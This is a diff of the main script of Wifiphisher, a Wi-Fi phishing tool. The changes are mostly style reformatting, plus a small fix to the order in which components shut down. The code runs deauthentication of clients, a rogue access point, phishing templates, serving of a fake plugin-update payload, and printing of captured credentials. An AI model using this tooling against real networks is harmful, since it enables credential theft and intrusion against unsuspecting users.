@@ -1,6 +1,6 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
-#pylint: skip-file
+# pylint: skip-file
 import subprocess
 import os
 import time
@@ -129,29 +129,55 @@ def check_args(args):
         (len(args.presharedkey) < 8
          or len(args.presharedkey) > 64):
         sys.exit(
-            '[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
+            '[' +
+            R +
+            '-' +
+            W +
+            '] Pre-shared key must be between 8 and 63 printable characters.')
 
     if ((args.jamminginterface and not args.apinterface) or
             (not args.jamminginterface and args.apinterface)) and \
             not (args.nojamming and args.apinterface):
-        sys.exit('[' + R + '-' + W + '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')
+        sys.exit(
+            '[' +
+            R +
+            '-' +
+            W +
+            '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')
 
     if args.nojamming and args.jamminginterface:
         sys.exit(
-            '[' + R + '-' + W + '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')
+            '[' +
+            R +
+            '-' +
+            W +
+            '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')
 
     if args.lure10_exploit and args.nojamming:
         sys.exit(
-            '[' + R + '-' + W + '] --lure10-exploit (-lE) and --nojamming (-nJ) cannot work together.')
+            '[' +
+            R +
+            '-' +
+            W +
+            '] --lure10-exploit (-lE) and --nojamming (-nJ) cannot work together.')
 
-    if args.lure10_exploit and not os.path.isfile(LOCS_DIR + args.lure10_exploit):
-        sys.exit(
-            '[' + R + '-' + W + '] Lure10 capture does not exist. Listing directory of captures: ' + str(os.listdir(LOCS_DIR)))
+    if args.lure10_exploit and not os.path.isfile(
+            LOCS_DIR + args.lure10_exploit):
+        sys.exit('[' +
+                 R +
+                 '-' +
+                 W +
+                 '] Lure10 capture does not exist. Listing directory of captures: ' +
+                 str(os.listdir(LOCS_DIR)))
 
     if (args.mac_ap_interface and args.no_mac_randomization) or \
             (args.mac_deauth_interface and args.no_mac_randomization):
         sys.exit(
-            '[' + R + '-' + W + '] --no-mac-randomization (-iNM) cannot work together with --mac-ap-interface or '
+            '[' +
+            R +
+            '-' +
+            W +
+            '] --no-mac-randomization (-iNM) cannot work together with --mac-ap-interface or '
             '--mac-deauth-interface (-iDM)')
 
 
@@ -281,13 +307,13 @@ def select_access_point(screen, interface, mac_matcher, network_manager):
 
     # get window height, length and create a box inside
     max_window_height, max_window_length = screen.getmaxyx()
-    box = curses.newwin(max_window_height-9, max_window_length-5, 4, 3)
+    box = curses.newwin(max_window_height - 9, max_window_length - 5, 4, 3)
     box.box()
 
     # calculate the box's maximum number of row's
     box_height = box.getmaxyx()[0]
     # subtracting 2 from the height for the border
-    max_row = box_height-2
+    max_row = box_height - 2
 
     # information regarding access points
     access_points = list()
@@ -302,12 +328,12 @@ def select_access_point(screen, interface, mac_matcher, network_manager):
         # resize the window if it's dimensions have been changed
         if screen.getmaxyx() != (max_window_height, max_window_length):
             max_window_height, max_window_length = screen.getmaxyx()
-            box.resize(max_window_height-9, max_window_length-5)
+            box.resize(max_window_height - 9, max_window_length - 5)
 
             # calculate the box's maximum number of row's
             box_height = box.getmaxyx()[0]
             # subtracting 2 from the height for the border
-            max_row = box_height-2
+            max_row = box_height - 2
 
             # reset the page and position to avoid problems
             position = 1
@@ -319,10 +345,17 @@ def select_access_point(screen, interface, mac_matcher, network_manager):
             total_ap_number = len(access_points)
 
         # display the information to the user
-        display_access_points((screen, box, access_points, total_ap_number, page_number, position), mac_matcher)
+        display_access_points((screen,
+                               box,
+                               access_points,
+                               total_ap_number,
+                               page_number,
+                               position),
+                              mac_matcher)
 
         # check for key movement and store result
-        key_movement_result = key_movement((key, position, page_number, max_row, access_points))
+        key_movement_result = key_movement(
+            (key, position, page_number, max_row, access_points))
         key = key_movement_result[0]
         position = key_movement_result[1]
         page_number = key_movement_result[2]
@@ -333,17 +366,18 @@ def select_access_point(screen, interface, mac_matcher, network_manager):
         # in case ENTER key has been pressed on a valid access point
         if key == ord("\n") and total_ap_number != 0:
             # show message and exit
-            screen.addstr(max_window_height-2, 3, "YOU HAVE SELECTED " +
-                          access_points[position-1].get_name())
+            screen.addstr(max_window_height - 2, 3, "YOU HAVE SELECTED " +
+                          access_points[position - 1].get_name())
             screen.refresh()
             time.sleep(1)
 
             # turn off access point discovery and return the result
             access_point_finder.stop_finding_access_points()
-            return access_points[position-1]
+            return access_points[position - 1]
 
     # turn off access point discovery
     access_point_finder.stop_finding_access_points()
+
 
 def key_movement(information):
     """
@@ -382,10 +416,10 @@ def key_movement(information):
     # in case arrow up key has been pressed
     elif key == curses.KEY_UP:
         # if not the first item
-        if (position-1) > 0:
+        if (position - 1) > 0:
             # if previous item is in previous page_number, change page
             # and move up otherwise just move up
-            if (position-1) % max_row == 0:
+            if (position - 1) % max_row == 0:
                 position -= 1
                 page_number -= 1
             else:
@@ -444,46 +478,61 @@ def display_access_points(information, mac_matcher):
     # calculate the box's maximum number of row's
     box_height = box.getmaxyx()[0]
     # subtracting 2 from the height for the border
-    max_row = box_height-2
+    max_row = box_height - 2
 
     # get the page boundary
-    page_boundary = range(1+(max_row*(page_number-1)), max_row+1+(max_row*(page_number-1)))
+    page_boundary = range(1 + (max_row * (page_number - 1)),
+                          max_row + 1 + (max_row * (page_number - 1)))
 
     # remove previous content and draw border
     box.erase()
     box.border(0)
 
     # show the header
-    header = ("{0:30} {1:17} {2:2} {3:3} {4:7} {5:20}".format("ESSID", "BSSID", "CH", "PWR",
-                                                              "CLIENTS", "VENDOR"))
-    screen.addstr(1, 3, "Options:  [Esc] Quit  [Up Arrow] Move Up  [Down Arrow] Move Down")
+    header = ("{0:30} {1:17} {2:2} {3:3} {4:7} {5:20}".format(
+        "ESSID", "BSSID", "CH", "PWR", "CLIENTS", "VENDOR"))
+    screen.addstr(
+        1,
+        3,
+        "Options:  [Esc] Quit  [Up Arrow] Move Up  [Down Arrow] Move Down")
     screen.addstr(3, 5, header)
 
     # show all the items based on their position
     for item_position in page_boundary:
         # in case of no access points discovered yet
         if total_ap_number == 0:
-            box.addstr(1, 1, "No access point has been discovered yet!",  highlight_text)
+            box.addstr(
+                1,
+                1,
+                "No access point has been discovered yet!",
+                highlight_text)
 
         # in case of at least one access point
         else:
             # get the access point and it's vendor
-            access_point = access_points[item_position-1]
-            vendor = mac_matcher.get_vendor_name(access_point.get_mac_address())
+            access_point = access_points[item_position - 1]
+            vendor = mac_matcher.get_vendor_name(
+                access_point.get_mac_address())
 
             # the display format for showing access points
-            display_text = ("{0:30} {1:17} {2:2} {3:3}% {4:^7} {5:20}"
-                            .format(access_point.get_name(), access_point.get_mac_address(),
-                                    access_point.get_channel(), access_point.get_signal_strength(),
-                                    access_point.get_number_connected_clients(), vendor))
+            display_text = (
+                "{0:30} {1:17} {2:2} {3:3}% {4:^7} {5:20}" .format(
+                    access_point.get_name(),
+                    access_point.get_mac_address(),
+                    access_point.get_channel(),
+                    access_point.get_signal_strength(),
+                    access_point.get_number_connected_clients(),
+                    vendor))
 
             # shows whether the access point should be highlighted or not
             # based on our current position
-            if item_position+(max_row*(page_number-1)) == position+(max_row*(page_number-1)):
-                box.addstr(item_position-(max_row*(page_number-1)), 2,
+            if item_position + (max_row * (page_number - 1)
+                                ) == position + (max_row * (page_number - 1)):
+                box.addstr(item_position - (max_row * (page_number - 1)), 2,
                            display_text, highlight_text)
             else:
-                box.addstr(item_position-(max_row*(page_number-1)), 2, display_text, normal_text)
+                box.addstr(item_position - (max_row * (page_number - 1)),
+                           2, display_text, normal_text)
 
             # stop if it is the last item in page
             if item_position == total_ap_number:
@@ -492,6 +541,7 @@ def display_access_points(information, mac_matcher):
     # update the screen
     screen.refresh()
     box.refresh()
+
 
 def kill_interfering_procs():
     # Kill any possible programs that may interfere with the wireless card
@@ -523,18 +573,20 @@ class WifiphisherEngine:
         self.template_manager = phishingpage.TemplateManager()
         self.access_point = accesspoint.AccessPoint()
         self.fw = firewall.Fw()
-        self.em = extensions.ExtensionManager()
+        self.em = extensions.ExtensionManager(self.network_manager)
 
     def stop(self):
         print "[" + G + "+" + W + "] Captured credentials:"
         for cred in phishinghttp.creds:
             print cred
 
+        # EM depends on Network Manager.
+        # It has to shutdown first.
+        self.em.on_exit()
         self.network_manager.on_exit()
         self.template_manager.on_exit()
         self.access_point.on_exit()
         self.fw.on_exit()
-        self.em.on_exit()
 
         if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
             os.remove('/tmp/wifiphisher-webserver.tmp')
@@ -564,36 +616,45 @@ class WifiphisherEngine:
         # to monitor mode. shutdown on any errors
         try:
             if args.internetinterface:
-                if self.network_manager.is_interface_valid(args.internetinterface, "internet"):
+                if self.network_manager.is_interface_valid(
+                        args.internetinterface, "internet"):
                     internet_interface = args.internetinterface
                     self.network_manager.unblock_interface(internet_interface)
             if not args.nojamming:
                 if args.jamminginterface and args.apinterface:
-                    if self.network_manager.is_interface_valid(args.jamminginterface, "monitor"):
+                    if self.network_manager.is_interface_valid(
+                            args.jamminginterface, "monitor"):
                         mon_iface = args.jamminginterface
                         self.network_manager.unblock_interface(mon_iface)
-                    if self.network_manager.is_interface_valid(args.apinterface, "AP"):
+                    if self.network_manager.is_interface_valid(
+                            args.apinterface, "AP"):
                         ap_iface = args.apinterface
                 else:
                     mon_iface, ap_iface = self.network_manager.get_interface_automatically()
                 # display selected interfaces to the user
-                print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
-                       "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
-                       "rogue Access Point").format(G, W, mon_iface, ap_iface)
+                print (
+                    "[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
+                    "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
+                    "rogue Access Point").format(
+                    G, W, mon_iface, ap_iface)
 
                 # randomize the mac addresses
                 if not args.no_mac_randomization:
                     if args.mac_ap_interface:
-                        self.network_manager.set_interface_mac(ap_iface, args.mac_ap_interface)
+                        self.network_manager.set_interface_mac(
+                            ap_iface, args.mac_ap_interface)
                     else:
                         self.network_manager.set_interface_mac_random(ap_iface)
                     if args.mac_deauth_interface:
-                        self.network_manager.set_interface_mac(mon_iface, args.mac_deauth_interface)
+                        self.network_manager.set_interface_mac(
+                            mon_iface, args.mac_deauth_interface)
                     else:
-                        self.network_manager.set_interface_mac_random(mon_iface)
+                        self.network_manager.set_interface_mac_random(
+                            mon_iface)
             else:
                 if args.apinterface:
-                    if self.network_manager.is_interface_valid(args.apinterface, "AP"):
+                    if self.network_manager.is_interface_valid(
+                            args.apinterface, "AP"):
                         ap_iface = args.apinterface
                 else:
                     ap_iface = self.network_manager.get_interface(True, False)
@@ -601,12 +662,15 @@ class WifiphisherEngine:
 
                 if not args.no_mac_randomization:
                     if args.mac_ap_interface:
-                        self.network_manager.set_interface_mac(ap_iface, args.mac_ap_interface)
+                        self.network_manager.set_interface_mac(
+                            ap_iface, args.mac_ap_interface)
                     else:
                         self.network_manager.set_interface_mac_random(ap_iface)
 
-                print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
-                       "rogue Access Point").format(G, W, ap_iface)
+                print (
+                    "[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
+                    "rogue Access Point").format(
+                    G, W, ap_iface)
                 # randomize the mac addresses
                 if not args.no_mac_randomization:
                     self.network_manager.set_interface_mac_random(ap_iface)
@@ -633,7 +697,8 @@ class WifiphisherEngine:
 
             if not args.nojamming:
                 mon_mac = self.network_manager.get_interface_mac(mon_iface)
-                print ("[{0}+{1}] {2} mac address becomes {3}".format(G, W, mon_iface, mon_mac))
+                print (
+                    "[{0}+{1}] {2} mac address becomes {3}".format(G, W, mon_iface, mon_mac))
 
         if args.internetinterface:
             self.fw.nat(ap_iface, args.internetinterface)
@@ -652,8 +717,11 @@ class WifiphisherEngine:
             enctype = None
         else:
             # let user choose access point
-            access_point = curses.wrapper(select_access_point, mon_iface, self.mac_matcher,
-                                          self.network_manager)
+            access_point = curses.wrapper(
+                select_access_point,
+                mon_iface,
+                self.mac_matcher,
+                self.network_manager)
 
             # if the user has chosen a access point continue
             # otherwise shutdown
@@ -668,10 +736,12 @@ class WifiphisherEngine:
         # create a template manager object
         self.template_manager = phishingpage.TemplateManager()
         # get the correct template
-        template = select_template(args.phishingscenario, self.template_manager)
+        template = select_template(
+            args.phishingscenario,
+            self.template_manager)
 
-        print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
-               " template")
+        print ("[" + G + "+" + W + "] Selecting " +
+               template.get_display_name() + " template")
 
         # payload selection for browser plugin update
         if template.has_payload():
@@ -679,9 +749,16 @@ class WifiphisherEngine:
             # copy payload to update directory
             while not payload_path or not os.path.isfile(payload_path):
                 # get payload path
-                payload_path = raw_input("[" + G + "+" + W +
-                                         "] Enter the [" + G + "full path" + W +
-                                         "] to the payload you wish to serve: ")
+                payload_path = raw_input(
+                    "[" +
+                    G +
+                    "+" +
+                    W +
+                    "] Enter the [" +
+                    G +
+                    "full path" +
+                    W +
+                    "] to the payload you wish to serve: ")
                 if not os.path.isfile(payload_path):
                     print '[' + R + '-' + W + '] Invalid file path!'
             print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
@@ -702,7 +779,8 @@ class WifiphisherEngine:
         # only get logo path if MAC address is present
         ap_logo_path = False
         if ap_mac:
-            ap_logo_path = template.use_file(self.mac_matcher.get_vendor_logo_path(ap_mac))
+            ap_logo_path = template.use_file(
+                self.mac_matcher.get_vendor_logo_path(ap_mac))
 
         template.merge_context({
             'target_ap_channel': channel or "",
@@ -728,12 +806,12 @@ class WifiphisherEngine:
         try:
             self.access_point.start()
             self.access_point.start_dhcp_dns()
-        except:
+        except BaseException:
             self.stop()
 
         # With configured DHCP, we may now start the web server
         if not args.internetinterface:
-        # Start HTTP server in a background thread
+            # Start HTTP server in a background thread
             print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
             webserver = Thread(target=phishinghttp.runHTTPServer,
                                args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
@@ -750,9 +828,6 @@ class WifiphisherEngine:
 
         deauthentication = None
         if not args.nojamming:
-            # set the channel on the deauthenticating interface
-            self.network_manager.set_interface_channel(mon_iface, int(channel))
-
             # Start Extension Manager
             shared_data = {
                 'target_ap_channel': channel or "",
@@ -761,12 +836,12 @@ class WifiphisherEngine:
                 'target_ap_encryption': enctype or "",
                 'target_ap_logo_path': ap_logo_path or "",
                 'rogue_ap_mac': ap_mac,
-                'APs': APs_context, 
+                'APs': APs_context,
                 'args': args
             }
             self.em.set_interface(mon_iface)
             extensions = DEFAULT_EXTENSIONS
-            
+
             if args.lure10_exploit:
                 extensions.append(LURE10_EXTENSION)
             self.em.set_extensions(extensions)
@@ -777,7 +852,7 @@ class WifiphisherEngine:
         try:
             term = Terminal()
             with term.fullscreen():
-                while 1:
+                while True:
                     term.clear()
                     with term.hidden_cursor():
                         print term.move(0, term.width - 30) + "|"
@@ -785,24 +860,26 @@ class WifiphisherEngine:
                         print term.move(2, term.width - 30) + "|" + " ESSID: " + essid
                         print term.move(3, term.width - 30) + "|" + " Channel: " + channel
                         print term.move(4, term.width - 30) + "|" + " AP interface: " + ap_iface
-                        print term.move(5, term.width - 30) + "|" + "_"*29
+                        print term.move(5, term.width - 30) + "|" + "_" * 29
                         print term.move(1, 0) + term.blue("Deauthenticating clients: ")
                         if not args.nojamming:
                             # show the 5 most recent entries
                             for line in self.em.get_output()[-5:]:
                                 print line
-                        print term.move(7,0) + term.blue("DHCP Leases: ")
+                        print term.move(7, 0) + term.blue("DHCP Leases: ")
                         if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
-                            proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
-                            print term.move(8,0) + proc
-                        print term.move(14,0) + term.blue("HTTP requests: ")
+                            proc = check_output(
+                                ['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
+                            print term.move(8, 0) + proc
+                        print term.move(14, 0) + term.blue("HTTP requests: ")
                         if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
-                            proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
-                            print term.move(15,0) + proc
+                            proc = check_output(
+                                ['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
+                            print term.move(15, 0) + proc
                         if phishinghttp.terminate and args.quitonsuccess:
                             raise KeyboardInterrupt
         except KeyboardInterrupt:
-            if deauthentication != None:
+            if deauthentication is not None:
                 deauthentication.on_exit()
             self.stop()
 
@@ -810,7 +887,7 @@ class WifiphisherEngine:
 def run():
     try:
         print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' %
-            (VERSION, time.strftime("%Y-%m-%d %H:%M")))
+               (VERSION, time.strftime("%Y-%m-%d %H:%M")))
         engine = WifiphisherEngine()
         engine.start()
     except KeyboardInterrupt:
